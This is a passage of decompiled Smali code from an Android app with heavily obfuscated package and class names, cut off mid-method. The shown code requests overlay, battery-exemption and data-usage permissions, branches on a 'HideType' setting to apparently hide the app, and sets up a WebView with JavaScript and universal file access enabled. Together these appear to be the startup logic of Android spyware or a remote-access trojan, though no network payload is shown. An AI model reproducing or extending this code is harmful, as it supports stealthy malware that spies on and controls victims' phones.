    invoke-direct {v9, v0, v14, v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$7;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Autodnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Start;Landroid/content/Context;)V

    invoke-virtual {v5, v8, v9}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 808
    invoke-virtual {v5}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 823
    :catch_1
    :cond_14
    :try_start_5
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v0, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->Work(Landroid/content/Context;)V

    .line 833
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt v5, v7, :cond_1c

    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NeedSuper()Z

    move-result v5

    if-nez v5, :cond_1c

    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->ASKDRAW()Z

    move-result v5

    if-eqz v5, :cond_1c

    invoke-static/range {p0 .. p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_1c

    .line 835
    invoke-direct/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->AskDraw()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_a

    .line 842
    :catch_2
    sput-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    .line 843
    :goto_6
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    const-string v7, "ask_battary"

    const-string v8, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v5, :cond_16

    .line 845
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 846
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v5, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_15

    .line 848
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    const/4 v5, 0x0

    .line 849
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v7

    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 855
    :cond_15
    sput-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_6

    .line 858
    :cond_16
    :goto_7
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_18

    .line 860
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 861
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v5, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_17

    .line 863
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    const/4 v5, 0x0

    .line 864
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_7

    .line 870
    :cond_17
    sput-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_7

    .line 873
    :cond_18
    :goto_8
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_1a

    .line 875
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 876
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v5, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_19

    .line 878
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    const/4 v5, 0x0

    .line 879
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_8

    .line 885
    :cond_19
    sput-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_8

    .line 888
    :cond_1a
    :goto_9
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_1c

    .line 890
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    .line 891
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    invoke-virtual {v5, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1b

    .line 893
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;->T2:Ljava/lang/String;

    const/4 v5, 0x0

    .line 894
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_9

    .line 900
    :cond_1b
    sput-object v6, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_9

    .line 907
    :cond_1c
    :goto_a
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->HideType:Ljava/lang/String;

    const-string v6, "K"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1d

    .line 909
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->Swapcegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53Me(Landroid/content/Context;)V

    .line 910
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->finish()V

    return-void

    .line 915
    :cond_1d
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v0, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->isinternetOK(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_27

    const v5, 0x7f080004

    .line 917
    invoke-virtual {v0, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->setContentView(I)V

    const v5, 0x7f060029

    .line 918
    invoke-virtual {v0, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    .line 919
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v6

    invoke-virtual {v6}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v6

    .line 920
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v7

    if-eq v7, v12, :cond_21

    if-eq v7, v11, :cond_20

    if-eq v7, v10, :cond_1f

    const/16 v3, 0xf2e

    if-eq v7, v3, :cond_1e

    goto :goto_b

    :cond_1e
    invoke-virtual {v6, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v13, 0x2

    goto :goto_c

    :cond_1f
    invoke-virtual {v6, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v13, 0x3

    goto :goto_c

    :cond_20
    invoke-virtual {v6, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v13, 0x0

    goto :goto_c

    :cond_21
    invoke-virtual {v6, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v13, 0x1

    goto :goto_c

    :cond_22
    :goto_b
    const/4 v13, -0x1

    :goto_c
    if-eqz v13, :cond_26

    const/4 v1, 0x1

    if-eq v13, v1, :cond_25

    const/4 v1, 0x2

    if-eq v13, v1, :cond_24

    const/4 v1, 0x3

    if-eq v13, v1, :cond_23

    const-string v1, "no internet connection detected.\n\n please connect to internet and try again"

    .line 938
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_23
    const-string v1, "internet ba\u011flant\u0131s\u0131 alg\u0131lanmad\u0131.\n\n l\u00fctfen internete ba\u011flan\u0131n ve tekrar deneyin"

    .line 934
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_24
    const-string v1, "\u672a\u68c0\u6d4b\u5230 Internet \u8fde\u63a5\u3002\n\n \u8bf7\u8fde\u63a5\u5230 Internet \u5e76\u91cd\u8bd5"

    .line 930
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_25
    const-string v1, "\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0643\u0634\u0641 \u0639\u0646 \u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a .\n\n \u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649"

    .line 926
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_26
    const-string v1, "No internet connection detected.\n\n please connect to internet and try again"

    .line 922
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :goto_d
    const v1, 0x7f06002b

    .line 944
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/ImageView;

    .line 945
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const v1, 0x7f060010

    .line 947
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    .line 948
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->out:Landroid/view/View$OnClickListener;

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_12

    .line 952
    :cond_27
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->AskDatausage()Z

    move-result v1

    if-eqz v1, :cond_28

    .line 953
    new-instance v1, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kldhjnbisxxzhdadygnnqzrqfliyjtkoaryhwebvvrmlkslfvm29net;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    .line 954
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x800000

    .line 955
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    .line 953
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->startActivity(Landroid/content/Intent;)V

    .line 961
    :cond_28
    :try_start_6
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/high16 v2, 0x1000000

    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :catch_3
    const v1, 0x7f080010

    .line 968
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->setContentView(I)V

    const v1, 0x7f060046

    .line 969
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    iput-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    .line 970
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 972
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    .line 973
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 974
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 975
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    .line 976
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 977
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 978
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 979
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    .line 980
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    .line 981
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v1, 0x0

    .line 984
    :try_start_7
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    const/4 v3, 0x2

    invoke-virtual {v2, v3, v1}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 985
    iget-object v2, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    sget-object v3, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

